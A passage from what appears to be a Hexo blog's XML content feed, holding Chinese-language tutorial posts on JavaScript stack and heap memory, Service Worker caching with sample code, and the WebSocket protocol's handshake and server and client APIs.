alt="堆栈图"><br>由上图可知我们无法直接操作存储在堆中的数据，但是我们可以通过栈中的引用来操作对象。</p><p>栈的优势就是存取速度比堆要快，存放在一级缓存中，仅次于直接位于CPU中的寄存器，但缺点是，存在栈中的数据大小与生存期必须是确定的，缺乏灵活性。</p><p>堆的优势是可以动态地分配内存大小，存在二级缓存中，生存期也不必事先告诉编译器，垃圾收集器会自动地收走这些不再使用的数据，比如对象和数组是可以无限拓展的，正好放在可以动态分配大小的堆中。但是缺点是由于在运行时动态分配内存，所以存取速度较慢。</p><h2 id="3-JS解释器"><a href="#3-JS解释器" class="headerlink" title="3.JS解释器"></a>3.JS解释器</h2><p>就是执行你的javascript代码的东东，就像你的java代码由JVM执行，javascript是由javascript解释器执行，浏览器中一般都会包含这个。<br>每个浏览器的并不一样，一般都包含在各浏览器的内核中<br>浏览器内核一般包含两个引擎：页面排版引擎 和 JS引擎</p><p>IE的 使用的自己的Trident 内核<br>FireFox 是Gecko内核<br>Opera 是Presto内核<br>Safari 使用的Webkit 内核<br>Chrome 是Google自己的 javascript V8引擎 而其页面排版采用的Webkit 内核</p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Service Worker</title>
      <link href="/2018/08/16/Service-Worker/"/>
      <url>/2018/08/16/Service-Worker/</url>
      
        <content type="html"><![CDATA[<h2 id="一，关于H5缓存技术"><a href="#一，关于H5缓存技术" class="headerlink" title="一，关于H5缓存技术"></a>一，关于H5缓存技术</h2><p>提到H5缓存我们应该会想到应用缓存(application cache)，只需要在标签上加一个配置<html menifest="index.appcache">，然后编辑对应的index.appcache,就能实现我们的缓存。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">CACHE MANIFEST<br><span class="hljs-comment"># v1 </span><br>CACHE:<br>index.html<br>cache.html<br>style.css<br>image1.png<br><br><span class="hljs-comment"># Use from network if available</span><br>NETWORK:<br>network.html<br><br><span class="hljs-comment"># Fallback content</span><br>FALLBACK:<br>/ fallback.html<br></code></pre></td></tr></table></figure></html></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Using_the_application_cache" target="_blank" rel="noopener">使用应用缓存(application cache) — MDN</a></p><h2 id="二，使用Service-Worker实现缓存"><a href="#二，使用Service-Worker实现缓存" class="headerlink" title="二，使用Service Worker实现缓存"></a>二，使用Service Worker实现缓存</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">Service_Worker_API</a></p><h3 id="1-什么事service-worker"><a href="#1-什么事service-worker" class="headerlink" title="1.什么事service worker"></a>1.什么事service worker</h3><p>service worker也称服务器工作线程，是浏览器在后台独立网页运行的脚本。我们平常浏览器窗口中跑的页面运行的是主JavaScript线程，DOM和window全局变量都是可以访问的。而Service Worker是走的另外的线程，可以理解为在浏览器背后默默运行的一个线程，脱离浏览器窗体，因此，window以及DOM都是不能访问的，此时我们可以使用self访问全局上下文。</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>请查看<a href="https://caniuse.com/#feat=serviceworkers" target="_blank" rel="noopener">https://caniuse.com/#feat=serviceworkers</a></p><h3 id="3-使用前提"><a href="#3-使用前提" class="headerlink" title="3.使用前提"></a>3.使用前提</h3><p>使用service worker，传输协议必须为HTTPS。因为service worker中涉及到请求拦截，所以必须使用HTTPS协议来保障安全。如果是本地调试的话，localhost是可以的。</p><h3 id="4-service-worker-的生命周期"><a href="#4-service-worker-的生命周期" class="headerlink" title="4.service worker 的生命周期"></a>4.service worker 的生命周期</h3><p><img src="https://img-blog.csdn.net/20171227141105043?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2NyZWFtaW5nX2NvbG9y/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="生命周期"></p><p>①注册（register）当你的应用未注册过service worker，那么第一步就是注册；<br>②安装（install）,注册完成之后，会触发install,在这一步我们可以进行文件缓存；<br>③响应请求（fetch）,fetch用于拦截用户请求，并响应，返回Promise对象,成功安装service worker后，待用户下次再进入页面，返回已返回的文件。<br>④更新（activate），当网站上当前页面被关闭，旧服务线程被终止。重新打开网页时，新服务工作线程取得控制权后，会触发activate事件。这一步我们可以清楚就版本缓存。</p><h3 id="5-使用"><a href="#5-使用" class="headerlink" title="5.使用"></a>5.使用</h3><p>页面中引用的js文件<br>进行service worker 注册<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (<span class="hljs-string">'serviceWorker'</span> <span class="hljs-keyword">in</span> navigator) &#123;<br>  navigator.serviceWorker.register(<span class="hljs-string">'/sw-test/sw.js'</span>, &#123; scope: <span class="hljs-string">'/sw-test/'</span> &#125;).<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(reg) &#123;<br><br>    <span class="hljs-keyword">if</span>(reg.installing) &#123;<br>      console.log(<span class="hljs-string">'Service worker installing'</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg.waiting) &#123;<br>      console.log(<span class="hljs-string">'Service worker installed'</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg.active) &#123;<br>      console.log(<span class="hljs-string">'Service worker active'</span>);<br>    &#125;<br><br>  &#125;).catch(<span class="hljs-keyword">function</span>(error) &#123;<br>    // registration failed<br>    console.log(<span class="hljs-string">'Registration failed with '</span> + error);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>service worker文件，sw.js<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">var VERSION = <span class="hljs-string">'v1'</span>;//一个存储空间<br><br>// 缓存<br>self.addEventListener(<span class="hljs-string">'install'</span>, <span class="hljs-keyword">function</span>(event) &#123;<br>  event.waitUntil(<br>    caches.open(VERSION).<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(cache) &#123;<br>      <span class="hljs-built_in">return</span> cache.addAll([//需要缓存的文件<br>        <span class="hljs-string">'/sw-test/'</span>,<br>        <span class="hljs-string">'/sw-test/index.html'</span>,<br>        <span class="hljs-string">'/sw-test/style.css'</span>,<br>        <span class="hljs-string">'/sw-test/app.js'</span>,<br>        <span class="hljs-string">'/sw-test/image-list.js'</span>,<br>        <span class="hljs-string">'/sw-test/star-wars-logo.jpg'</span>,<br>        <span class="hljs-string">'/sw-test/gallery/bountyHunters.jpg'</span>,<br>        <span class="hljs-string">'/sw-test/gallery/myLittleVader.jpg'</span>,<br>        <span class="hljs-string">'/sw-test/gallery/snowTroopers.jpg'</span><br>      ]);<br>    &#125;)<br>  );<br>&#125;);<br><br>// 缓存更新<br>self.addEventListener(<span class="hljs-string">'activate'</span>, <span class="hljs-keyword">function</span>(event) &#123;<br>  event.waitUntil(<br>    caches.keys().<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(cacheNames) &#123;<br>      <span class="hljs-built_in">return</span> Promise.all(<br>        cacheNames.map(<span class="hljs-keyword">function</span>(cacheName) &#123;<br>          // 如果当前版本和缓存版本不一致<br>          <span class="hljs-keyword">if</span> (cacheName !== VERSION) &#123;<br>            <span class="hljs-built_in">return</span> caches.delete(cacheName);<br>          &#125;<br>        &#125;)<br>      );<br>    &#125;)<br>  );<br>&#125;);<br><br>// 捕获请求并返回缓存数据<br>self.addEventListener(<span class="hljs-string">'fetch'</span>, <span class="hljs-keyword">function</span>(event) &#123;<br>  event.respondWith(caches.match(event.request).catch(<span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    <span class="hljs-built_in">return</span> fetch(event.request);<br>  &#125;).<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(response) &#123;<br>    caches.open(VERSION).<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(cache) &#123;<br>      cache.put(event.request, response);<br>    &#125;);<br>    <span class="hljs-built_in">return</span> response.clone();<br>  &#125;).catch(<span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    <span class="hljs-built_in">return</span> caches.match(<span class="hljs-string">'/sw-test/gallery/myLittleVader.jpg'</span>);<br>  &#125;));<br>&#125;);<br></code></pre></td></tr></table></figure></p><p>运行demo: <a href="https://mdn.github.io/sw-test/" target="_blank" rel="noopener">https://mdn.github.io/sw-test/</a><br>打开浏览器查看（请使用隐身模式）：<br>选择offline 页面依旧显示正常 </p><p><img src="https://img-blog.csdn.net/20171227150136893?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2NyZWFtaW5nX2NvbG9y/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSocket</title>
      <link href="/2018/08/15/WebSocket/"/>
      <url>/2018/08/15/WebSocket/</url>
      
        <content type="html"><![CDATA[<h2 id="WebSocket介绍与原理"><a href="#WebSocket介绍与原理" class="headerlink" title="WebSocket介绍与原理"></a>WebSocket介绍与原理</h2><blockquote><p>WebSocket protocol 是HTML5一种新的协议。它实现了浏览器与服务器全双工通信(full-duplex)。一开始的握手需要借助HTTP请求完成。<br>——百度百科</p></blockquote><h2 id="目的：及时通讯，替代轮询"><a href="#目的：及时通讯，替代轮询" class="headerlink" title="目的：及时通讯，替代轮询"></a>目的：及时通讯，替代轮询</h2><p>网站上的即时通讯是很常见的，比如网页的QQ，聊天系统等。按照以往的技术能力通常是采用轮询、Comet技术解决。</p><p>HTTP协议是非持久化的，单向的网络协议，在建立连接后只允许浏览器向服务器发出请求后，服务器才能返回相应的数据。当需要即时通讯时，通过轮询在特定的时间间隔（如1秒），由浏览器向服务器发送Request请求，然后将最新的数据返回给浏览器。这样的方法最明显的缺点就是需要不断的发送请求，而且通常HTTP request的Header是非常长的，为了传输一个很小的数据 需要付出巨大的代价，是很不合算的，占用了很多的宽带。</p><p>缺点：会导致过多不必要的请求，浪费流量和服务器资源，每一次请求、应答，都浪费了一定流量在相同的头部信息上</p><p>然而WebSocket的出现可以弥补这一缺点。在WebSocket中，只需要服务器和浏览器通过HTTP协议进行一个握手的动作，然后单独建立一条TCP的通信通道进行数据的传送。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>WebSocket同HTTP一样也是应用层的协议，但是它是一种双向通信协议，是建立在TCP之上的。</p><h2 id="连接过程——握手过程"><a href="#连接过程——握手过程" class="headerlink" title="连接过程——握手过程"></a>连接过程——握手过程</h2><ol><li>浏览器、服务器建立TCP连接，三次握手。这是通信的基础，传输控制层，若失败后续都不执行。</li><li>TCP连接成功后，浏览器通过HTTP协议向服务器传送WebSocket支持的版本号等信息。（开始前的HTTP握手）</li><li>服务器收到客户端的握手请求后，同样采用HTTP协议回馈数据。</li><li>当收到了连接成功的消息后，通过TCP通道进行传输通信。</li></ol><h2 id="WebSocket与HTTP的关系"><a href="#WebSocket与HTTP的关系" class="headerlink" title="WebSocket与HTTP的关系"></a>WebSocket与HTTP的关系</h2><h3 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h3><ol><li>都是一样基于TCP的，都是可靠性传输协议。</li><li>嗾使应用层协议。</li></ol><h3 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h3><ol><li>WebSocket是双向通信协议，模拟Socket协议，可以双向发送或接受信息。HTTP是单向的。</li><li>WebSocket是需要握手进行建立连接的。</li></ol><h3 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h3><p>WebSocket在建立握手时，数据是通过HTTP传输的。但是建立之后，在真正传输时候是不需要HTTP协议的。</p><h2 id="WebSocket与Socket的关系"><a href="#WebSocket与Socket的关系" class="headerlink" title="WebSocket与Socket的关系"></a>WebSocket与Socket的关系</h2><p>Socket其实并不是一个协议，而是为了方便使用TCP或UDP而抽象出来的一层，是位于应用层和传输控制层之间的一组接口。</p><blockquote><p>Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。</p></blockquote><p>当两台主机通信时，必须通过Socket连接，Socket则利用TCP/IP协议建立TCP连接。TCP连接则更依靠于底层的IP协议，IP协议的连接则依赖于链路层等更低层次。</p><p>WebSocket则是一个典型的应用层协议。</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>Socket是传输控制层协议，WebSocket是应用层协议。</p><h3 id="HTML5和WebSocket的关系"><a href="#HTML5和WebSocket的关系" class="headerlink" title="HTML5和WebSocket的关系"></a>HTML5和WebSocket的关系</h3><p>WebSocket API 是 HTML5 标准的一部分， 但这并不代表 WebSocket 一定要用在 HTML 中，或者只能在基于浏览器的应用程序中使用。</p><p>实际上，许多语言、框架和服务器都提供了 WebSocket 支持，例如：</p><ul><li>基于 C 的 libwebsocket.org</li><li>基于 Node.js 的 Socket.io</li><li>基于 Python 的 ws4py</li><li>基于 C++ 的 WebSocket++</li><li>Apache 对 WebSocket 的支持： Apache Module mod_proxy_wstunnel</li><li>Nginx 对 WebSockets 的支持： NGINX as a WebSockets Proxy 、 NGINX Announces Support for WebSocket Protocol 、WebSocket proxying</li><li>lighttpd 对 WebSocket 的支持：mod_websocket</li></ul><h2 id="WebSocket机制"><a href="#WebSocket机制" class="headerlink" title="WebSocket机制"></a>WebSocket机制</h2><p>以下简要介绍一下 WebSocket 的原理及运行机制。</p><p>WebSocket 是 HTML5 一种新的协议。它实现了浏览器与服务器全双工通信，能更好的节省服务器资源和带宽并达到实时通讯，它建立在 TCP 之上，同 HTTP 一样通过 TCP 来传输数据，但是它和 HTTP 最大不同是：</p><ul><li>WebSocket 是一种双向通信协议，在建立连接后，WebSocket 服务器和 Browser/Client Agent 都能主动的向对方发送或接收数据，就像 Socket 一样；</li><li>WebSocket 需要类似 TCP 的客户端和服务器端通过握手连接，连接成功后才能相互通信。<br>非 WebSocket 模式传统 HTTP 客户端与服务器的交互如下图所示：<br><img src="http://www.ibm.com/developerworks/cn/java/j-lo-WebSocket/img001.jpg" alt="图一，传统HTTP请求响应客户端服务器交互图"></li></ul><p>使用 WebSocket 模式客户端与服务器的交互如下图：<br><img src="http://www.ibm.com/developerworks/cn/java/j-lo-WebSocket/img002.jpg" alt="图二，WebSocket请求响应客户端服务器交互图"></p><p>上图对比可以看出，相对于传统 HTTP 每次请求-应答都需要客户端与服务端建立连接的模式，WebSocket 是类似 Socket 的 TCP 长连接的通讯模式，一旦 WebSocket 连接建立后，后续数据都以帧序列的形式传输。在客户端断开 WebSocket 连接或 Server 端断掉连接前，不需要客户端和服务端重新发起连接请求。在海量并发及客户端与服务器交互负载流量大的情况下，极大的节省了网络带宽资源的消耗，有明显的性能优势，且客户端发送和接受消息是在同一个持久连接上发起，实时性优势明显。</p><p>我们再通过客户端和服务端交互的报文看一下 WebSocket 通讯与传统 HTTP 的不同：</p><p>在客户端，new WebSocket 实例化一个新的 WebSocket 客户端对象，连接类似 ws://yourdomain:port/path 的服务端 WebSocket URL，WebSocket 客户端对象会自动解析并识别为 WebSocket 请求，从而连接服务端端口，执行双方握手过程，客户端发送数据格式类似：</p><h3 id="清单1-WebSocket客户端连接报文"><a href="#清单1-WebSocket客户端连接报文" class="headerlink" title="清单1.WebSocket客户端连接报文"></a>清单1.WebSocket客户端连接报文</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /webfin/websocket/ HTTP/1.1<br>Host: localhost<br>Upgrade: websocket<br>Connection: Upgrade<br>Sec-WebSocket-Key: xqBt3ImNzJbYqRINxEFlkg==<br>Origin: http://localhost:8080<br>Sec-WebSocket-Version: 13<br></code></pre></td></tr></table></figure><p>可以看到，客户端发起的 WebSocket 连接报文类似传统 HTTP 报文，”Upgrade：websocket”参数值表明这是 WebSocket 类型请求，“Sec-WebSocket-Key”是 WebSocket 客户端发送的一个 base64 编码的密文，要求服务端必须返回一个对应加密的“Sec-WebSocket-Accept”应答，否则客户端会抛出“Error during WebSocket handshake”错误，并关闭连接。</p><p>服务端收到报文后返回的数据格式类似：</p><h3 id="清单2-WebSocket服务端响应报文"><a href="#清单2-WebSocket服务端响应报文" class="headerlink" title="清单2.WebSocket服务端响应报文"></a>清单2.WebSocket服务端响应报文</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1 101 Switching Protocols<br>Upgrade: websocket<br>Connection: Upgrade<br>Sec-WebSocket-Accept: K7DJLdLooIwIG/MOpvWFB3y3FE8=<br></code></pre></td></tr></table></figure><p>“Sec-WebSocket-Accept”的值是服务端采用与客户端一致的密钥计算出来后返回客户端的,“HTTP/1.1 101 Switching Protocols”表示服务端接受 WebSocket 协议的客户端连接，经过这样的请求-响应处理后，客户端服务端的 WebSocket 连接握手成功, 后续就可以进行 TCP 通讯了。</p><p>在开发方面，WebSocket API 也十分简单，我们只需要实例化 WebSocket，创建连接，然后服务端和客户端就可以相互发送和响应消息，在下文 WebSocket 实现及案例分析部分，可以看到详细的 WebSocket API 及代码实现。</p><h2 id="WebSocket实现"><a href="#WebSocket实现" class="headerlink" title="WebSocket实现"></a>WebSocket实现</h2><p>如上文所述，WebSocket 的实现分为客户端和服务端两部分，客户端（通常为浏览器）发出 WebSocket 连接请求，服务端响应，实现类似 TCP 握手的动作，从而在浏览器客户端和 WebSocket 服务端之间形成一条 HTTP 长连接快速通道。两者之间后续进行直接的数据互相传送，不再需要发起连接和相应。</p><p>以下简要描述 WebSocket 服务端 API 及客户端 API。</p><h3 id="WebSocket服务端API"><a href="#WebSocket服务端API" class="headerlink" title="WebSocket服务端API"></a>WebSocket服务端API</h3><p>WebSocket 服务端在各个主流应用服务器厂商中已基本获得符合 JEE JSR356 标准规范 API 的支持，以下列举了部分常见的商用及开源应用服务器对 WebSocket Server 端的支持情况：</p><table><thead><tr><th>厂商</th><th style="text-align:center">应用服务器</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td>IBM</td><td style="text-align:center">WebSphere</td><td style="text-align:left">WebSphere 8.0 以上版本支持，7.X 之前版本结合 MQTT 支持类似的 HTTP 长连接</td></tr><tr><td>甲骨文</td><td style="text-align:center">WebLogic</td><td style="text-align:left">WebLogic 12c 支持，11g 及 10g 版本通过 HTTP Publish 支持类似的 HTTP 长连接</td></tr><tr><td>微软</td><td style="text-align:center">IIS</td><td style="text-align:left">IIS 7.0+支持</td></tr><tr><td>Apache</td><td style="text-align:center">Tomcat</td><td style="text-align:left">Tomcat 7.0.5＋支持，7.0.2X 及 7.0.3X 通过自定义 API 支持</td></tr><tr><td></td><td style="text-align:center">Jetty</td><td style="text-align:left">Jetty 7.0＋支持</td></tr></tbody></table><p>以下我们使用 Tomcat7.0.5 版本的服务端示例代码说明 WebSocket 服务端的实现：</p><p>JSR356 的 WebSocket 规范使用 javax.websocket.*的 API，可以将一个普通 Java 对象（POJO）使用 @ServerEndpoint 注释作为 WebSocket 服务器的端点，代码示例如下：</p><h3 id="清单3-WebSocket服务端API实例"><a href="#清单3-WebSocket服务端API实例" class="headerlink" title="清单3.WebSocket服务端API实例"></a>清单3.WebSocket服务端API实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">@ServerEndpoint(<span class="hljs-string">"/echo"</span>)<br> public class EchoEndpoint &#123;<br><br> @OnOpen<br> public void onOpen(Session session) throws IOException &#123;<br> //以下代码省略...<br> &#125;<br> <br> @OnMessage<br> public String onMessage(String message) &#123;<br> //以下代码省略...<br> &#125;<br><br> @Message(maxMessageSize=6)<br> public void receiveMessage(String s) &#123;<br> //以下代码省略...<br> &#125; <br><br> @OnError<br> public void onError(Throwable t) &#123;<br> //以下代码省略...<br> &#125;<br> <br> @OnClose<br> public void onClose(Session session, CloseReason reason) &#123;<br> //以下代码省略...<br> &#125; <br> <br> &#125;<br></code></pre></td></tr></table></figure><p>代码解释：</p><p>上文的简洁代码即建立了一个 WebSocket 的服务端，@ServerEndpoint(“/echo”) 的 annotation 注释端点表示将 WebSocket 服务端运行在 ws://[Server 端 IP 或域名]:[Server 端口]/websockets/echo 的访问端点，客户端浏览器已经可以对 WebSocket 客户端 API 发起 HTTP 长连接了。</p><p>使用 ServerEndpoint 注释的类必须有一个公共的无参数构造函数，@onMessage 注解的 Java 方法用于接收传入的 WebSocket 信息，这个信息可以是文本格式，也可以是二进制格式。</p><p>OnOpen 在这个端点一个新的连接建立时被调用。参数提供了连接的另一端的更多细节。Session 表明两个 WebSocket 端点对话连接的另一端，可以理解为类似 HTTPSession 的概念。</p><p>OnClose 在连接被终止时调用。参数 closeReason 可封装更多细节，如为什么一个 WebSocket 连接关闭。</p><p>更高级的定制如 @Message 注释，MaxMessageSize 属性可以被用来定义消息字节最大限制，在示例程序中，如果超过 6 个字节的信息被接收，就报告错误和连接关闭。</p><p>注意：早期不同应用服务器支持的 WebSocket 方式不尽相同，即使同一厂商，不同版本也有细微差别，如 Tomcat 服务器 7.0.5 以上的版本都是标准 JSR356 规范实现，而 7.0.2x/7.0.3X 的版本使用自定义 API （WebSocketServlet 和 StreamInbound， 前者是一个容器，用来初始化 WebSocket 环境；后者是用来具体处理 WebSocket 请求和响应，详见案例分析部分），且 Tomcat7.0.3x 与 7.0.2x 的 createWebSocketInbound 方法的定义不同，增加了一个 HttpServletRequest 参数，使得可以从 request 参数中获取更多 WebSocket 客户端的信息，如下代码所示：</p><h3 id="清单4-Tomcat7-0-3X版本WebSocket-API"><a href="#清单4-Tomcat7-0-3X版本WebSocket-API" class="headerlink" title="清单4.Tomcat7.0.3X版本WebSocket API"></a>清单4.Tomcat7.0.3X版本WebSocket API</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">public class EchoServlet extends WebSocketServlet &#123;<br>@Override<br>protected StreamInbound createWebSocketInbound(String subProtocol,<br>HttpServletRequest request) &#123;<br> //以下代码省略....<br><span class="hljs-built_in">return</span> new <span class="hljs-function"><span class="hljs-title">MessageInbound</span></span>() &#123;<br> //以下代码省略....<br>&#125;<br>protected void onBinaryMessage(ByteBuffer buffer)<br>throws IOException &#123;<br> //以下代码省略...<br>&#125;<br>protected void onTextMessage(CharBuffer buffer) throws IOException &#123;<br> getWsOutbound().writeTextMessage(buffer);<br> //以下代码省略...<br>&#125;<br>&#125;;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此选择 WebSocket 的 Server 端重点需要选择其版本，通常情况下，更新的版本对 WebSocket 的支持是标准 JSR 规范 API，但也要考虑开发易用性及老版本程序移植性等方面的问题，如下文所述的客户案例，就是因为客户要求统一应用服务器版本所以使用的 Tomcat 7.0.3X 版本的 WebSocketServlet 实现，而不是 JSR356 的 @ServerEndpoint 注释端点。</p><h2 id="WebSocket-客户端API"><a href="#WebSocket-客户端API" class="headerlink" title="WebSocket 客户端API"></a>WebSocket 客户端API</h2><p>对于 WebSocket 客户端，主流的浏览器（包括 PC 和移动终端）现已都支持标准的 HTML5 的 WebSocket API，这意味着客户端的 WebSocket JavaScirpt 脚本具备良好的一致性和跨平台特性，以下列举了常见的浏览器厂商对 WebSocket 的支持情况：</p><table><thead><tr><th>浏览器</th><th style="text-align:left">支持情况</th></tr></thead><tbody><tr><td>Chrome</td><td style="text-align:left">Chrome version 4+支持</td></tr><tr><td>Firefox</td><td style="text-align:left">Firefox version 5+支持</td></tr><tr><td>IE</td><td style="text-align:left">IE version 10+支持</td></tr><tr><td>Safari</td><td style="text-align:left">IOS 5+支持</td></tr><tr><td>Android Brower</td><td style="text-align:left">Android 4.5+支持</td></tr></tbody></table><p>客户端 WebSocket API 基本上已经在各个主流浏览器厂商中实现了统一，因此使用标准 HTML5 定义的 WebSocket 客户端的 JavaScript API 即可，当然也可以使用业界满足 WebSocket 标准规范的开源框架，如 Socket.io。</p><p>以下以一段代码示例说明 WebSocket 的客户端实现：</p><h3 id="清单5-WebSocket客户端API实例"><a href="#清单5-WebSocket客户端API实例" class="headerlink" title="清单5.WebSocket客户端API实例"></a>清单5.WebSocket客户端API实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var ws = new WebSocket(“ws://echo.websocket.org”); <br> ws.onopen = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;ws.send(“Test!”); &#125;; <br> ws.onmessage = <span class="hljs-keyword">function</span>(evt)&#123;console.log(evt.data);ws.close();&#125;; <br> ws.onclose = <span class="hljs-keyword">function</span>(evt)&#123;console.log(“WebSocketClosed!”);&#125;; <br> ws.onerror = <span class="hljs-keyword">function</span>(evt)&#123;console.log(“WebSocketError!”);&#125;;<br></code></pre></td></tr></table></figure><p>第一行代码是在申请一个 WebSocket 对象，参数是需要连接的服务器端的地址，同 HTTP 协议开头一样，WebSocket 协议的 URL 使用 ws://开头，另外安全的 WebSocket 协议使用 wss://开头。</p><p>第二行到第五行为 WebSocket 对象注册消息的处理函数，WebSocket 对象一共支持四个消息 onopen, onmessage, onclose 和 onerror，有了这 4 个事件，我们就可以很容易很轻松的驾驭 WebSocket。</p><p>当 Browser 和 WebSocketServer 连接成功后，会触发 onopen 消息；如果连接失败，发送、接收数据失败或者处理数据出现错误，browser 会触发 onerror 消息；当 Browser 接收到 WebSocketServer 发送过来的数据时，就会触发 onmessage 消息，参数 evt 中包含 Server 传输过来的数据；当 Browser 接收到 WebSocketServer 端发送的关闭连接请求时，就会触发 onclose 消息。我们可以看出所有的操作都是采用异步回调的方式触发，这样不会阻塞 UI，可以获得更快的响应时间，更好的用户体验。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数节流与函数防抖</title>
      <link href="/2018/08/14/%E5%87%BD%E6%95%B0%E8%8A%82%E6%B5%81%E4%B8%8E%E5%87%BD%E6%95%B0%E9%98%B2%E6%8A%96/"/>
